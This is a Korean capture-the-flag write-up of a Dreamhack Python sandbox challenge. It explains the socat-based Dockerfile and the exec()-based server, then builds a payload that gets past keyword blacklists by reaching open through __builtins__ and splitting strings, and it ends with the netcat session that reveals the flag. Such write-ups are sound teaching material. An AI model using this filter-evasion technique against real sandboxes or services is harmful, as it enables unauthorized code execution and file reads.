도커 파일을 보자.

``` Dockerfile
CMD ["socat", "TCP-LISTEN:5000,reuseaddr,fork", "EXEC:python3 chall.py,nofork,stderr"]
# socat을 실행하여 5000번 포트에서 TCP 연결을 받아올 때마다 python3 chall.py 실행
# 연결이 들어올 때마다(=fork) 새로운 python3 chall.py 프로세스가 실행됨
# 표준에러(stderr) 연결, nofork 옵션으로 exec 명령을 하나만 실행하도록 제한, 쉽게 말하면, 각 소켓 연결마다 프로세스가 하나씩 실행되고, 그 프로세스는 다시 fork하지 않는다는 의미.
```

결론은, 접속하면 chall.py 프로그램이 실행된다는 것.
그리고 정답은 /chall/flag.txt에 있다는 것.

이제 chall.py 파일을 보자.
블라~블라~ 말이 많지만, 목적은 아래 코드를 실행시키는 것이다.

``` python
exec(code) # (*) Search what does 'exec' means!
```

exec는 파이선 내장함수로, 파라미터로 받은 코드의 내용이 파이선으로 실행된다.
code = "print('this is print code')"
라고 하고, exec(code) 하면 print('this is print code') 코드가 파이선으로 실행되는 것이다.

자, 이제 결론은?
/chall/flag.txt에 있는 내용을 화면에 출력하는 파이선 코드를 짜서 입력하면 된다.
단순하게 아래와 같이 짜면 되겠지만...

``` python
print(open('/chall/flag.txt').read())
```

금지 단어가 있는 것이 문제다. 금지 단어에 open, flag, read 등등이 들어가 있기 때문
이런 단어를 우회해서 파이선 코드를 실행시켜야 한다.

파이선은 모든 것이 "객체"로 되어 있다. 함수들도 모두 "객체"다.
객체들은 각자가 이름을 가지고 있고, 따라서 이름-객체 가 key-value 딕셔너리 형태로 되어 있다.
네임스페이스는 이런 key-value의 집합. 즉, 딕셔너리라고 보면 된다.

open()이라는 함수도 이런 딕셔너리 안에 들어있고, 그 딕셔너리가 바로 __builtins__ 딕셔너리다.
따라서 open()함수는 다음과 같이 호출할 수 있다.

``` python
getattr(__builtins__, "__dict__")["open"]
```

그러나 여전히 금지어 open에 걸리지 않는가?
따라서 "open"을 적당히 찢어주자. 

``` python
getattr(__builtins__, "__dict__")["op" + "en"]
```

자, 이제 파일 경로도 마찬가지로 금지어에 걸리지 않게 적당히 찢어주자.


``` python
getattr(__builtins__, "__dict__")["op"+"en"]("/chall/"+"fl"+"ag.txt")
```

open한 것은 읽어야한다. open의 결과도 객체다. 객체의 속성에 read가 있다.
객체의 속성도 역시 딕셔너리일텐데, 속성을 이름으로 가져올 수 있는 __getattribute__ 함수를 제공한다.
__getattribute__ 함수를 사용해 read를 찢어서 "re"+"ad"로 가져온다.

``` python
getattr(__builtins__, "__dict__")["op"+"en"]("/chall/"+"fl"+"ag.txt").__getattribute__("re"+"ad")()
```

자, 이제 print로 출력만 하면 된다.

``` python
print(getattr(__builtins__, "__dict__")["op"+"en"]("/chall/"+"fl"+"ag.txt").__getattribute__("re"+"ad")())
```

짠! 정답

```shell
chorockuin@PN-00055213-01:/mnt/c/Users/Administrator$ nc host3.dreamhack.games 23557
Welcome to Python Challenge! Input your code and capture the flag!
Input code > print(getattr(__builtins__, "__dict__")["op"+"en"]("/chall/"+"fl"+"ag.txt").__getattribute__("re"+"ad")())
DH{Welc0m3_To_Python_Ch4l1enge!}
```
